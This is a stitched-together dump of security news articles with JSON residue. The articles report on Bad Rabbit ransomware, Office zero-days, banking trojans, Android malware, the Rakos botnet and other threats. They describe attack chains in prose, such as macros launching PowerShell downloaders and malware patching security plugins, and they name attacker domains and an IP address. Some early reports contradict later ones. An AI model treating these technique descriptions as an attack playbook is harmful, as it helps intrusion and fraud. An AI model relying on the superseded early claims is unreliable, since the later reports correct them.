According to Check Point, malicious actors bribed the employees of a Chinese gaming company to include a piece of malware among the legitimate files sent to Chinese security company Qihoo 360 for whitelisting. The malicious file sent through the gaming company passed Qihoo’s verification process and ended up being whitelisted, which allowed cybercriminals to deliver their malware without the concern that it might be detected by the security firm’s free antivirus product, which is very popular in China. Once their malware was whitelisted, the attackers turned to the popular Chinese online marketplace Taobao.com, where users can acquire an item by sending a picture of it to the seller via the instant messaging app AliWangwang. The payment is then made through Alibaba’s Alipay online payment platform. The attackers sent the seller a harmless-looking image containing a Trojan. Since the malware had been whitelisted, it would not be flagged as malicious if the victim was using Qihoo 360’s antivirus product. Cybercriminals would then request a refund, and when the seller logged in to their Alipay account to process the transaction, the malware stole their login credentials, allowing the hackers to transfer money from the compromised Alipay account. On one hand, the incident demonstrates how whitelists used by antivirus vendors can be abused by malicious actors. It also once again shows that attackers can bypass verification processes — as it has often happened in the case of malware published on Google Play and the Apple App Store — and users end up installing applications that are not as safe as they would think. The Chinese company Qihoo 360 is well known in the West for its skilled researchers, who have often discovered serious vulnerabilities in popular software, including as part of international hacking contests like Pwn2Own. However, the company has a stained reputation in the industry when it comes to its products. Testing bodies AV Comparatives, AV-TEST and Virus Bulletin decided to revoke all certifications and rankings awarded to Qihoo 360 products last year after they found that the products submitted for testing behaved differently from ones offered to customers.

The company has resolved more than 50 security holes affecting Windows, Internet Explorer, Edge, Office, the .NET framework, and Flash Player, for which Adobe released an update on Tuesday. A blog post published by Microsoft revealed that the company had worked with ESET and FireEye to protect customers against attacks leveraging vulnerabilities in the Encapsulated PostScript (EPS) filter in Office. Both ESET and FireEye have released reports on the attacks they have observed. FireEye has spotted attacks launched by a couple of cyber espionage groups believed to be connected to the Russian government and an unknown financially-motivated threat actor. According to the security firm, the group known as Turla, Waterbug, KRYPTON and Venomous Bear has been exploiting an Office remote code execution (RCE) vulnerability tracked as CVE-2017-0261 to deliver a custom JavaScript implant dubbed by FireEye “SHIRIME.” The same vulnerability has also been exploited by profit-driven cybercriminals to deliver a new variant of the NETWIRE malware, a threat used by multiple actors over the past years. The Turla group’s attacks also leveraged CVE-2017-0001 for privilege escalation, while the cybercriminals used CVE-2016-7255 for privilege escalation. Both FireEye and ESET have observed attacks involving zero-day vulnerabilities launched by the group known as APT28, Pawn Storm, Fancy Bear, Sofacy, Sednit and Strontium. This Russia-linked group, which some believe could be behind the recent election cyberattacks in France, has leveraged an Office RCE flaw (CVE-2017-0262) and a Windows privilege escalation (CVE-2017-0263). The malware delivered in these attacks is tracked by the security firms as Seduploader and GAMEFISH. Microsoft pointed out that the Turla attacks were first spotted in March, and customers who had up-to-date systems had already been protected as CVE-2017-0001 was patched earlier that month. In April, the company also rolled out a defense-in-depth protection designed to prevent EPS attacks by disabling the EPS filter by default. The updates released by the company this month patch the EPS-related vulnerabilities in Office (CVE-2017-0261 and CVE-2017-0262) to ensure that customers who need to use EPS filters are still protected. Another zero-day patched by Microsoft on Tuesday is CVE-2017-0222, a memory corruption in Internet Explorer that can be exploited for remote code execution. No information has been shared on the attacks leveraging this security hole. The tech giant has also addressed four vulnerabilities that have been publicly disclosed. The list includes an RCE flaw in the JavaScript engines used by web browsers (CVE-2017-0229), a SmartScreen filter-related browser spoofing vulnerability (CVE-2017-0231), a privilege escalation in Edge (CVE-2017-0241), and a Mixed Content warnings bypass in Internet Explorer (CVE-2017-0064).

A majority of the Bad Rabbit victims are in Russia – over 80% according to some reports – where the ransomware hit several media outlets, including Interfax. Significant infections have also been observed in Ukraine, where the malware reportedly hit major organizations such as the airport in Odessa, the Kiev subway, the State Aviation Service of Ukraine, and the Transport Ministry of Ukraine. Infections have also been spotted in Bulgaria, Turkey, Germany, Japan, the United States, South Korea and Poland. Unlike the NotPetya attack, which hit tens of thousands of systems in more than 65 countries, Bad Rabbit, delivered by attackers via fake Flash Player installers, only infected a few hundred machines mainly belonging to enterprises. The attack began on October 24 at around 10 AM UTC and the majority of infection attempts were detected in the first couple of hours. Analysis conducted by researchers and security firms showed many connections between Bad Rabbit and NotPetya, including the use of legitimate features such as SMB to spread within the compromised network. However, Bad Rabbit does not use EternalBlue or any other exploit. [UPDATE. Bad Rabbit does in fact use the EternalRomance exploit to spread] The security researcher known online as Bart Blaze has published a useful table summarizing the similarities and differences between NotPetya and Bad Rabbit. The similarities include targeting of Ukraine and Russia, binaries signed with expired certificates, use of Mimikatz for credential-grabbing, reboots and persistence via scheduled tasks, removal of event logs and USN change journals, and the same type of file encryption and ransomware functionality. One of the most significant differences is the fact that Bad Rabbit appears to be an actual ransomware and, at least in theory, users can recover their encrypted files if they pay the ransom; unlike NotPetya, which has been classified as a wiper due to the fact that the ransom payment functionality is not implemented properly, making the recovery of files impossible. Bad Rabbit infrastructure Kaspersky Lab researcher Costin Raiu pointed out that several of the compromised domains used in the Bad Rabbit attack had been set up for malicious activity since at least July. An analysis by RiskIQ shows that some of the injection servers involved in the attack were set up more than a year ago. “While this list is most likely incomplete, it does show that it’s part of a long-running campaign. The operators of this campaign have been able to use this position to target unique visitors based on IP space they associate with their targets,” explained RiskIQ’s Yonathan Klijnsma. “The thing we do not understand at this point is why they decided to burn this information position to mass distribute the BadRabbit ransomware rather than save it for another type of malware. The goal of the attack using ExPetya back in June was simple: cause as much disruption in the Ukraine and those associated with Ukraine as possible which also seems the case in the BadRabbit attack,” Klijnsma added. Russian security firm Group-IB noted that the domain serving the fake Flash Player installer, 1dnscontrol[dot]com, was hosted by Inferno, which is run by the same people as 3NT Solutions and V3Servers. The activities of this hosting company were detailed back in 2014 by British researcher Conrad Longmore, who has now provided an updated list of IP addresses that he believes should be blocked by organizations. “The domain name 1dnscontrol.com was registered on 22 March 2016 and is currently prolonged. There are a number of malicious domains associated with this site, which relate back to 2011. It is possible that these domains have also been compromised or are used for analogous attacks,” Group-IB said. Links to BlackEnergy NotPetya, which is also tracked as Diskcoder, Petya, Petrwrap, exPetr and GoldenEye, was linked back in early July to a threat group known as TeleBots, BlackEnergy and Sandworm Team, which experts have tied to Russia and which is believed to be behind cyberattacks on Ukraine’s power grid. NotPetya was linked to BlackEnergy based on similarities to a wiper used by the threat actor, Yara rules detecting both BlackEnergy and NotPetya malware, and previous ransomware attacks that hit Ukraine. Several security firms and researchers pointed out that if the NotPetya attack was conducted by BlackEnergy, and Bad Rabbit was created by the same developers that made NotPetya, the obvious conclusion would be that Bad Rabbit is also the work of the Russia-linked hackers.

Researchers at the security vendor Avast called out three apps laced with adware. The most popular of these is the Durak card game, which has been downloaded between five and 10 million times. The other apps were a history application and an IQ test app. Unlike other examples of adware, these applications waited an extended period of time before displaying anything.   \"When you install Durak, it seems to be a completely normal and well working gaming app,\" Avast's Filip Chytry blogged Tuesday. \"This was the same for the other apps, which included an IQ test and a history app. This impression remains until you reboot your device and wait for a couple of days. After a week, you might start to feel there is something wrong with your device. Some of the apps wait up to 30 days until they show their true colors. After 30 days, I guess not many people would know which app is causing abnormal behavior on their phone right?\" Each time an infected user unlocked their device an ad would be presented to them warning them about a problem such as the device being infected or out-of-date. \"This, of course, is a complete lie,\" Chytry blogged.  The user is then asked to take action. If they approve, they are redirected to harmful threats on fake pages, such as \"dubious app stores and apps that attempt to send premium SMS behind your back or to apps that simply collect too much of your data for comfort while offering you no additional value,\" he continued.  Sometimes users were directed to security apps on Google Play. However even if the user installed the security apps, the ads would still appear, Chytry noted. \"This kind of threat can be considered good social engineering,\" he wrote. \"Most people won‘t be able to find the source of the problem and will face fake ads each time they unlock their device. I believe that most people will trust that there is a problem that can be solved with one of the apps advertised “solutions” and will follow the recommended steps, which may lead to an investment into unwanted apps from untrusted sources.\" " }

A Boleto is essentially a document that allows a customer to pay an exact amount to a merchant. Anyone who owns a bank account - whether a company or an individual - can issue a Boleto associated with their bank.  \"The first signs of its existence appeared near the end of 2012 or early 2013, when it began to be reported in the local news media,\" according to a whitepaper RSA released today on the malware. \"The RSA Research Group analyzed version 17 of the malware, gathering data between March 2014 and June 2014. The main goal of Boleto malware is to infiltrate legitimate Boleto payments from individual consumers or companies and redirect those payments from victims to fraudster accounts.\" \"Although not directly related to the Boleto payment systems, the malware also collects user credentials from Microsoft online email services such as live.com, hotmail.com and outlook.com,\" according to the paper. \"It appears that these stolen credentials are being used to support infection campaigns by spreading spam email.\" In its investigation, RSA found 8,095 fraudulent Boleto ID numbers associated with 495,753 compromised transactions. It is not known how many of these Boletos were actually paid by the victims and whether all those funds were redirected to bank accounts controlled by the attackers. All together, RSA found 192,227 infected computers controlled by the attackers based on the number of unique IP addresses. The attackers are believed to have affected more than 30 different banks in Brazil. The researchers also found 83,506 email user credentials stolen and collected by the Boleto malware. \"The malware infects web browsers to intercept and modify Boletos by two different methods,\" according to the report. \"In both cases, the Boleto information is modified so that the payment is redirected either to a fraudster’s account or a mule account. Since the malware is MITB, all malware activities will be invisible to both the user and the web application.\" According to RSA, the malware is being delivered via email. In Brazil, when banking customers access their online banking site for the first time, they are often asked to install a security plugin. When the customer does so, a protection service is created and starts running on the PC. In addition, some shared libraries are also installed on the system and are loaded by the browser in order to help provide protection for customers during online banking operations, RSA noted. However, the Boleto malware the company detected searches for specific versions of client side security plug-ins detects their shared libraries and patches them in real-time to dodge security. In one case, RSA analysts noticed that the malware accessed the plugin's memory area and modified a conditional JMP to a regular JMP operation, thereby thwarting the plugin's capabilities. \"While the Bolware fraud ring may not be as far-reaching as some larger international cybercrime operations, it does appear to be an extremely lucrative venture for its masterminds,\" blogged Eli Marcus of RSA’s FraudAction Knowledge Delivery team. \"As outlined in the detailed analysis from RSA Research, the developers have gone to great lengths to make Bolware effective and also hard to detect – refining features designed to evade detection and clean-up by endpoint anti-malware products.\" RSA has turned over its research along with a number of fraudulent Boleto ID numbers to the FBI and Brazilian law enforcement.

Dubbed PowerWare, this piece of malware is being delivered via a more traditional method, namely macro-enabled Microsoft Word documents, but it no longer writes malicious files to disk, as most ransomware does. Instead, it calls for PowerShell, a core utility of current Windows systems, to perform malicious operations, thus attempting to blend in with more legitimate computer activity. Ransomware has evolved over the past several months to become one of the biggest threats to both consumers and enterprises, courtesy of families such as CryptoWall, Locky, and Teslacrypt. Ransomware is often delivered via malicious emails and via Exploit Kits, and cybercriminals appear determined to employ new techniques to make their malware more efficient. Most recently, ransomware started attacking hospitals, and PowerWare first emerged in a campaign targeting a healthcare organization, Carbon Black researchers reveal. The ransomware is delivered via malicious Word documents that use embedded macros to spawn “cmd.exe” on the target computer, which in turn calls PowerShell to download and run the PowerWare code. Researchers noticed that, as soon as the user enables the macros to run in the malicious document, cmd.exe spawns and launches two instances of PowerShell, one to download the ransomware script, and the second to start with the script as input. The script generates random numbers for the encryption key and for the UUID assigned to the endpoint. The script also sends the information to the attacker controlled host via HTTP, and does that in plain text, an approach that actually creates an operational weakness. Basically, users who have a full capture packet solution can analyze the traffic to identify the right domain and IP info and retrieve the encryption key. After communicating with the command and control server, the script encrypts files that have specific extensions (it can encrypt a broad range of file formats, the researchers found out). The ransomware also includes an HTML file in every folder with encrypted files, providing users with information on how they can regain access to their files and demanding a $500 ransom (which doubles after two weeks). While PowerWare’s behavior is different from that of popular ransomware families out there, the use of PowerShell to perform file encryption on compromised systems is not new, but was observed in 2014 by Sophos researchers analyzing a piece of Russian ransomware. Cybercriminals have been abusing PowerShell in other malware as well, with the most recent example being PowerSniff. " }

LokiBot has been around since at least June and its authors have been rolling out new features nearly every week. Once it infects an Android device (running Android version 4.0 or later), the malware starts displaying overlay screens on top of banking and other popular apps in an effort to trick victims into handing over their information. The malware targets roughly 100 banking applications and popular apps such as WhatsApp, Skype and Outlook. The malware can also open the user’s web browser and navigate to a specified page, reply to SMS messages, and launch banking apps. “Combine this with the fact that LokiBot can show notifications which seem to come from other apps, containing for example a message that new funds have been deposited to the victim’s account and interesting phishing attack scenarios arise!” SfyLabs researchers said in a blog post. “The phishing notifications use the original icon of the application they try to impersonate. In addition, the phone is made to vibrate right before the notification is shown so the victim will take notice of it. When the notification is tapped it will trigger an overlay attack.” The most interesting feature, which has led researchers to classify LokiBot as a hybrid Android malware, is its ability to turn into ransomware when users attempt to remove it. Specifically, when users try to revoke its admin privileges, the malware initiates a procedure to encrypt all files on the device’s external storage and locks the screen with a typical ransom demand claiming that the phone is locked for “viewing child pornography.” Victims are given 48 hours to pay a $70 - $100 “fine” in bitcoin.  SfyLabs found that the bitcoin address provided by the cybercriminals already stores cryptocurrency worth roughly $1.5 million. However, it’s unlikely that the entire amount comes from LokiBot attacks as the campaigns spotted by experts generally have only around 1,000 bots and the cost of the Trojan itself is $2,000. Researchers noticed that while the screen-locking functionality works, the malware doesn’t actually encrypt files. Due to an error, files are automatically restored after being encrypted, but with a different name. The malware’s developers have implemented some mechanisms designed to prevent dynamic analysis, but they are not particularly sophisticated, especially compared to other malware. It’s worth noting that there is another Loki Bot malware that targets Windows devices. This threat is designed to steal data from infected computers and it has reportedly been used as a secondary payload in the NotPetya attack launched in late June. " }

Rakos, whose existence was brought to light in December 2016 by ESET, targets Linux systems by launching brute-force attacks via SSH. The security firm reported at the time that the compromised machines had not been leveraged for DDoS attacks or spam campaigns, as one might expect. Brazil-based Morphus Labs recently deployed some high interaction honeypots that were quickly targeted by Rakos. A closer analysis revealed that the botnet had ensnared roughly 8,300 devices per day across 178 countries. Rakos consists of bots and command and control (C&C) servers, but since it’s a peer-to-peer botnet some infected machines may play both these roles. Rakos bots obtain a list of IP addresses from a C&C server and attack those hosts via SSH. Each compromised device will in turn target other devices. The botnet has been described as “transient” due to the fact that the infection is not persistent after a reboot of the hacked device. Morphus Labs researchers analyzed the botnet by using crawlers and by injecting fake nodes to act as sensors. Data collected over the course of 72 hours revealed the existence of just over 25,000 unique infected devices, or roughly 8,300 per day. This includes nearly 300 machines that served as C&C servers. The country with the highest number of nodes was China (3,300), followed by Vietnam, Taiwan, Thailand, Russia, India, Brazil and the United States, which had just under 1,000 unique infections.  Experts determined that more than 45 percent of the compromised devices were Raspberry Pis, followed by Open Embedded Linux Entertainment Center (OpenELEC) systems, which also typically run on Raspberry Pi. Unsurprisingly, the third most targeted systems are wireless access points from Ubiquiti Networks, which are often targeted by cybercriminals. The Rakos botnet can hack devices because their owners have neglected to set strong passwords, but researchers pointed out that, in some cases, such as OpenELEC, default SSH passwords cannot be changed by users. While 8,000 bots might not seem much, Morphus noted that a new Mirai variant recently used a similar number of compromised devices to launch a significant DDoS attack on a U.S. college. The attack lasted for 54 hours and peaked at 37,000 requests per second (RPS). However, there is currently no evidence of malicious activity coming from Rakos, except for the brute-force SSH attacks. “It seems that someone is preparing it to be sold or to offer ‘services’ using it when it gets in the right size,” explained Renato Marinho, director of research at Morphus Labs. “Thinking this way, the innocuous-looking may be a strategy to fly under the radar.” " }

According to the report, which surveyed 645 IT pros and IT security practitioners and was sponsored by security firm Spike Security, web-borne malware attacks cost the organizations in the survey an average of $3.2 million to remediate. The organizations surveyed had an average of 14,000 employees. Sixty-nine percent believe browser-borne malware is a more significant threat today than it was 12 months ago. \"The findings of this research reveal that current solutions are not stopping the growth of web-borne malware,\" said Dr. Larry Ponemon, chairman and founder of Ponemon Institute, in a statement.\"Almost all IT practitioners in our study agree that their existing security tools are not capable of completely detecting web-borne malware and the insecure web browser is a primary attack vector. Further, the findings are evidence of the need for a more effective solution to stop web-borne malware.\" While all of the companies surveyed utilized a multilayered, defense-in-depth approach, they still dealt with an average of 51 security breaches during the past year tied to the failure of malware detection technology. According to the findings, the cost to respond to and remediate a single breach resulting from these detection failures was roughly $62,000 per incident. Fifty-one percent of the respondents said they are not receiving the resources or budget they need to effectively detect and contain the threat, and 49 percent said defending against web-borne malware is not a security posture. Fifty-two percent classified their ability to detect and contain such malware as weak or very weak. Many of these infections are the result of insecure web browsers, with vulnerable browsers being to blame for 55 percent of the malware infections. \"While the Web browser has become the most strategically important application on corporate desktops, it is also, unfortunately, the most vulnerable application in terms of being a delivery channel for malware leading to cyber attacks,\" said Branden Spikes, CEO, CTO, and founder of Spikes Security, in a statement. \"What many organizations forget is that the browser is the only application that is permitted to download and execute code from a 3rd party location -- any external web site. Every time you allow unknown code into your network, you put yourself and your business at risk. This is why browser isolation outside the network is so important. It is the only way to prevent this problem.\" " }
{ "_id" : { "$oid" : "5b27c4e86cefc41c844ab40d" }, "Category" : "Malware", "Title" : "Sophisticated USB Trojan Spotted in the Wild", "Address" : "https://www.securityweek.com/sophisticated-usb-trojan-spotted-wild", "Date" : "March 23, 2016", "Article" : "Researchers at ESET have discovered a sophisticated data-stealing USB Trojan that leaves no trace on the compromised system and includes a self-protection mechanism that makes it difficult to detect, copy and analyze. The threat, dubbed by the security firm “USB Thief,” has been spotted on USB devices in the wild. One aspect that makes it stand out from other USB malware families is that each copy is bound to a single USB drive. Unlike other USB threats that leverage autorun and shortcut files to get executed, USB Thief relies on the fact that users often store portable versions of Firefox, NotePad++, TrueCrypt and other popular applications on USB sticks. According to ESET, the malware injects itself into the execution chain of such applications by posing as a plugin or a DLL file. When a victim launches the targeted app from an infected USB drive, the Trojan is also executed in the background. The malware has six different component files – four executables and two configuration files. In order to ensure that it cannot be copied from a USB drive and reverse engineered, some USB Thief files are encrypted using an AES encryption key generated based on the USB device’s unique ID and certain disk properties. The names of the files executed during every stage of the infection routine are different for each instance as they are generated based on file content and creation time. This mechanism ensures that the malware doesn’t work on devices other than the USB drive on which it was planted by the attacker, preventing researchers from analyzing the threat. The first stage loader is responsible for executing the Trojan via portable applications and checking if the USB device from which it’s run is writeable so that the stolen information can be stored there. The second stage loader verifies the name of the parent process to ensure that it’s not being executed in an analysis environment, while the third stage loader checks for the presence of antivirus software. The final payload, which is injected into a newly created process, is designed to steal information from the infected device, including images, documents, the Windows registry tree, file lists from all available drives, and data collected by a Windows inventory utility called WinAudit. The stolen information is encrypted using elliptic curve cryptography and stored on the USB drive from which the infection started. Since the malware is being executed from a USB device, the infection doesn’t leave any trace on the targeted machine. ESET experts believe the threat is ideal for targeted attacks against air-gapped systems. “This malware is unique because of some particular features but the defense against it still falls within the capabilities of general cybersecurity measures,” explained ESET malware analyst Tomáš Gardoň. “Most importantly, USB ports should be disabled wherever possible and, if that’s not possible, strict policies should be in place to enforce care in their use. It’s highly desirable for staff at all levels to undergo cybersecurity training – including real-life testing – if possible.” USB Thief is not the only USB malware analyzed by ESET. The company has also investigated one of the tools used by the notorious Pawn Storm/APT28/Sednit group to steal data from air-gapped networks. " }

The malware, according to FireEye, may herald more Android-focused banking threats from the developer. The malware has been dubbed HijackRAT by FireEye. It was also detected by researchers at Cheetah Mobile, who described it here.  \"In the past, we’ve seen Android malware that execute privacy leakage, banking credential theft, or remote access separately, but this sample takes Android malware to a new level by combining all of those activities into one app,\" explained researchers Jinijan Zhai and Jimmy Su in a blog post.  \"In addition,\" they continued, \"we found the hacker has designed a framework to conduct bank hijacking and is actively developing towards this goal. We suspect in the near future there will be a batch of bank hijacking malware once the framework is completed. Right now, eight Korean banks are recognized by the attacker, yet the hacker can quickly expand to new banks with just 30 minutes of work.\" The company installed the eight Korean bank apps on a testing device for their analysis. Once the malware is on the device, the command and control server sends a command to replace the existing bank apps. The banking apps require the installation of 'com.ahnlab.v3mobileplus', an antivirus application available on Google Play. In order to evade detection, the malware kills the anti-virus application before manipulating the bank apps. \"The package name of this new RAT (remote access tool) malware is “com.ll” and appears as “Google Service Framework” with the default Android icon,\" the researchers explained. \"Android users can’t remove the app unless they deactivate its administrative privileges in 'Settings.' So far, the Virus Total score of the sample is only five positive detections out of 54 AV vendors. Such new malware is published quickly partly because the CNC server, which the hacker uses, changes so rapidly.\" Shortly after the malicious application is installed, the Google Services icon appears on the home screen. When the user clicks that icon, the app requests administrative privileges. Once activated, the uninstall option is disabled and a new service named \"GS\" is started. The icon will show \"App isn't installed\" when the user tries to click it again and removes itself from the home screen. Within a few minutes, the app connects with the command and control server and receives a task list from it. According to FireEye, the server is located in Hong Kong. \"We cannot tell if it’s the hacker’s IP or a victim IP controlled by the RAT, but the URL is named after the device ID and the UUID generated by the CNC server,\" the researchers blogged. The malware will try to download an application named after 'update' and an abbreviation of the bank's name from the command and control server, simultaneously uninstalling the original banking app. When the command to 'update' is sent from the remote access tool, a similar app - 'update.apk' is downloaded from the command and control server and installed on the Android phone. Among the other tasks the malware carries out is the uploading of details from the phone, including phone numbers, device IDs and contact lists to the attacker's server. Though the IP addresses the researchers captured do not reveal who the attacker is, based on the malware's user interface, FireEye believes both the malware developer and the victims are Korean speakers.

Both are known adware and infostealers, collecting device-related data such as OS information and GPS location, Trend Micro noted. In its second quarter security report, Trend Micro reported that the amount of Google Android malware and high-risk apps had already reached 718,000, up from 509,000 in the first quarter of the year. Nearly half of the mobile malware (44 percent) uncovered during the second quarter was designed to subscribe unwitting users to costly services, while the next largest groups belonged to data stealers (24 percent) and adware (17 percent). \"The threat to mobile devices, however, is not limited rogue versions of popular apps and adware,\" Abendan blogged. \"Threat actors are also pouncing on mobile users’ banking transactions, with the likes of FAKEBANK and FAKETOKEN malware threatening users.\" " }

The tool, initially called Fulcrum and later renamed Archimedes by its developers, can be used to conduct MitM attacks within a local area network (LAN). The leaked documents, dated between 2011 and 2014, describe it as a tool that allows the user to redirect LAN traffic from a targeted computer through an attacker-controlled machine before it’s passed on to the gateway. “This enables the tool to inject a forged web-server response that will redirect the target’s web browser to an arbitrary location. This technique is typically used to redirect the target to an exploitation server while providing the appearance of a normal browsing session,” developers wrote in the tool’s user guide. Jake Williams, founder of Rendition Infosec and SANS instructor, analyzed the leaked documents and determined that the tool appears to be a repackaged version of Ettercap, a popular MitM tool. While the tool’s capabilities are not impressive, Williams pointed out that potential targets of the CIA can use the leaked information to see if their systems had been targeted by the agency.    .@wikileaks Honestly I'm more interested in how WikiLeaks tries to spin this than I am in the tool itself. 6/6 — Jake Williams (@MalwareJake) May 5, 2017    A more interesting tool, including its source code, was published by WikiLeaks last week. The project, dubbed Scribbles, is designed for inserting special watermarks into documents that may be copied by insiders and whistleblowers. The first major version of the Scribbles tool was released in March 2016 and it may have been developed by the CIA to identify people such as Edward Snowden, who in 2013 leaked a massive amount of information on the NSA’s surveillance capabilities. WikiLeaks has already released numerous documents as part of its “Vault 7” dump. In the past weeks, the whistleblower organization has made public documents describing various tools, including ones for hacking Samsung smart TVs, a framework used to make attribution and analysis of malware more difficult, and a platform designed for creating custom malware installers. Many of the tools are outdated and the vulnerabilities they leverage have already been patched. However, the leaked information can be very useful for entities that may have been targeted with these exploits. In fact, researchers at Symantec and Kaspersky have found links between the tools exposed by Wikileaks and the malware used by a cyber espionage group tracked as Longhorn and The Lamberts. " }

Several cybersecurity firms have conducted an initial analysis of the threat, including Cisco Talos, Kaspersky, Malwarebytes, ESET, McAfee, Bitdefender and Trend Micro. Bad Rabbit distribution Researchers say the malware spreads via watering hole attacks that deliver a fake Flash Player installer. The malicious file has been delivered from compromised websites in Denmark, Ireland, Bulgaria, Turkey and Russia. Researchers pointed out that victims need to manually launch the fake Flash installer to get infected, and the file needs to obtain administrative privileges, which causes Windows to display a User Account Control (UAC) prompt. The attackers have not made any effort to bypass UAC. Once executed, the dropper copies the main module (infpub.dat) to the Windows folder and executes it through rundll32.exe, a Windows component used to run code in DLL files. Scheduled tasks, which have been given dragon names from the “Game of Thrones” TV show, are used to execute other malware components and reboot the system. The ransom note is displayed in both text files dropped onto the system and via a bootlocker screen.  Similar to NotPetya, Bad Rabbit does appear to rely on SMB to spread, but, contrary to initial reports, it does not use the NSA-linked EternalBlue exploit. The malware scans the internal network for open SMB shares with a specific name. The threat relies on the Mimikatz post-exploitation tool to harvest credentials, but it also includes a hardcoded list of usernames and passwords. Bad Rabbit file encryption Once it infects a system, Bad Rabbit encrypts more than 100 file types, including archives, backups, databases, images, documents, source code, and virtual disk images. The encrypted files are given a .encrypted extension. Kaspersky’s Costin Raiu pointed out that the file types are similar to the ones targeted by NotPetya, but not identical. Bad Rabbit clears security logs and deletes the update sequence number (USN) change journal, which logs all changes made to files on the volume, to prevent recovery. The encryption relies on DiskCryptor, an open source full disk encryption software, and the attackers have used the AES-128-CBC cipher and an RSA-2048 public key. It’s still unclear if files can be recovered without paying the ransom. However, unlike NotPetya, which made it impossible to decrypt files even if the ransom had been paid, researchers confirmed that data encrypted by Bad Rabbit is recoverable with the right key. Victims are asked to pay 0.05 bitcoin, worth roughly $280, to get their files back, but the amount increases if the ransom is not paid within two days. Bad Rabbit victims A majority of the victims are in Russia, where the ransomware hit several media outlets, including Interfax and Fontanka. A significant number of Infections has also been observed in Ukraine, where the malware reportedly hit the airport in Odessa, the Kiev subway, the State Aviation Service of Ukraine, and the Transport Ministry of Ukraine. Infections have also been spotted in Bulgaria, Turkey, Germany, Japan and other countries. Some of the organizations whose systems have been compromised reported suffering significant disruptions. Unlike the NotPetya attack, which hit tens of thousands of systems in more than 65 countries, Kaspersky reported that it had only seen roughly 200 victims. The security firm believes this may have been a targeted attack aimed at corporate networks. Bad Rabbit links to NotPetya Several security firms have classified Bad Rabbit as a variant of NotPetya, the malware that hit numerous organizations in late June and caused losses of millions of dollars for several major companies. NotPetya has also been tracked as Diskcoder, Petya, Petrwrap, exPetr and GoldenEye. While NotPetya initially also appeared to be a piece of ransomware, researchers noticed that the encrypted files could not have been recovered even if the ransom had been paid. The malware was later reclassified as a wiper. The list of similarities between NotPetya and Bad Rabbit includes the fact that both use SMB to spread, they create scheduled tasks to reboot the system, the ransom screen is very similar, both use .dat files as the main component, and some of the functionality and code is almost identical. On the other hand, unlike NotPetya, Bad Rabbit does not use the EternalBlue exploit, its encryption functionality works properly and a more advanced crypter is used, it uses a different kernel and bootloader, and the attacks appear to have been more targeted. Another significant difference is the fact that NotPetya was delivered via a Ukraine-based company’s update server, while Bad Rabbit leverages drive-by attacks. " }

The caper targeted customers of a specific bank in Europe using a man-in-the-browser attack. On January 20, Kaspersky Lab identified a suspicious server with log files that included events from bots reporting to a command-and-control web panel. The information being sent indicated financial fraud, and included details of victims and the amount of money stolen. \"After further analysis we found additional files in the server containing logs with different content and showing potentially fraudulent banking transactions, as well as source code in JavaScript related to the [command and control] C2 infrastructure,\" according to Kaspersky Lab researchers. \"This information provided valuable data about the bank that had been targeted and other details such as the money-mule system and operational details used in this scheme.\" What the firm uncovered was an operation that victimized around 190 people, mostly in Turkey and Italy, as well as international bank account numbers belonging to both victims and mules. They also found logs detailing fraudulent transactions that totaled more than 500,000 euros. The researchers named the command-and-control server 'Luuuk', after the path the administration panel used in the server: /server/adm/luuuk. \"The control panel was hosted in the domain uvvya-jqwph.eu, resolving to the IP address 109.169.23.134 during the analysis,\" the researchers explained. \"The fraudulent campaign targeted users of a single bank. Even though we were not able to get the malicious code used on the victims, we believe the criminals used a banking Trojan performing Man-in-the-Browser operations to get the credentials of their victims through a malicious web injection. Based on the information available in some of the log files, the malware stole usernames, passwords and OTP codes in real time.\" Those kinds of injections, the researchers noted, are common in all the variants of ZeuS. The attackers used the stolen credentials to check the account balance of the victim and perform fraudulent transactions. The attackers also used predefined money mules to transfer the stolen money. According to the transaction logs, four different money mule groups were used: \"This could be an indicator of a well-organized mule infrastructure,\" according to Kaspersky Lab. \"Different groups have different limits on the money that can be transferred to its mules, an indicator of the levels of trust between them.\" The cybercriminals operating the control panel removed all sensitive components on Jan. 22 - just two days after the firm's investigation started. \"Based on the transaction activity we believe that this could be an infrastructure change rather than a complete shutdown of the operation,\" the researchers explained. \"In addition, based on the fraudulent transaction activity detected in the server and several additional indicators, we believe that the criminals behind the operation are very active.\" " }

Few details are known so far about the Bad Rabbit attack, which has the potential to cause significant damage. Infected computers display a screen informing users that their files have been encrypted and instructing them to access a website over the Tor anonymity network. The Tor site tells victims to pay 0.05 bitcoin, worth roughly $283, to obtain the key needed to recover the encrypted files. However, the price goes up if the ransom is not paid within two days.  The list of organizations reportedly hit by the Bad Rabbit ransomware includes Russian media outlets Interfax and Fontanka, the airport in Odessa, the Kiev subway, the State Aviation Service of Ukraine, and the Transport Ministry of Ukraine. Interfax and others said the attack disrupted their operations. Researchers are still analyzing the malware, but initial reports claim Bad Rabbit has been distributed via fake Flash Player updates. Some said the ransomware also leverages the Mimikatz post-exploitation tool for lateral movement within the compromised network. Kaspersky’s Anton Ivanov revealed that the threat uses code from a legitimate disk encryption utility named DiskCryptor. Security firm ESET said the malware appears to be a new variant of NotPetya, also known as Diskcoder, Petya, Petrwrap, exPetr and GoldenEye. However, this has not been confirmed by other researchers. ESET reported that while most infections are in Russia and Ukraine, some compromised machines were also detected in Turkey, Bulgaria and other countries. There are also some reports that Bad Rabbit uses SMB – specifically the NSA-linked EternalBlue exploit – to spread, just like NotPetya. However, this hasn’t been confirmed either. The attack does remind of NotPetya, which started spreading via a software update from a Ukrainian company. However, NotPetya turned out to be a wiper instead of ransomware. The fact that another major attack has hit Ukraine is not surprising considering that the country’s Security Service warned earlier this month about a possible large-scale cyberattack on state organizations and private companies. The agency said the purpose of the attack would be to disrupt IT systems and destabilize the situation in the country. " }

